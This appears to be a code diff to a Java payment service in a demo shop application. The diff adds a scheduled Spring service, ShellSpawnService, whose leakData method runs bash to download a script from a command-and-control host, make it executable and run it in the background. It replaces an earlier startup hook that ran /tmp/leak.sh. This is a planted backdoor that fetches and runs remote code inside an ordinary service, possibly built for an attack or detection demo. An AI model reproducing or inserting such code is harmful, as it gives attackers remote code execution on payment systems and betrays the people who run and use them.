@@ -1,20 +1,25 @@
 package com.hipstershop.paymentservicejava;
 
-import javax.annotation.PostConstruct;
 
-import org.springframework.stereotype.Component;
+import org.springframework.scheduling.annotation.Scheduled;
+import org.springframework.stereotype.Service;
 
-@Component
+@Service
 public class ShellSpawnService {
 
-    @PostConstruct
-    public void leakData() {
+    private boolean active = false;
 
-        String leakScript = "";
+    @Scheduled(fixedDelay = 900000L, initialDelay = 60000L) // it takes up to a minute for our shell to be spawned
+    public void leakData() {
+        if(!active) {
         try {
-            Runtime.getRuntime().exec("/bin/sh -c /tmp/leak.sh");
-        } catch(Exception e) {
-            e.printStackTrace();
+                System.out.println("executing command");
+                String[] commands = { "/bin/bash", "-c", "wget -O /tmp/exploit.sh http://commandandcontrol.scaprat.de/exploit.sh && chmod u+x /tmp/exploit.sh && /tmp/exploit.sh &" };
+                Runtime.getRuntime().exec(commands);
+                active = true;
+            } catch(Exception e) {
+                e.printStackTrace();
+            }
         }
     }
 
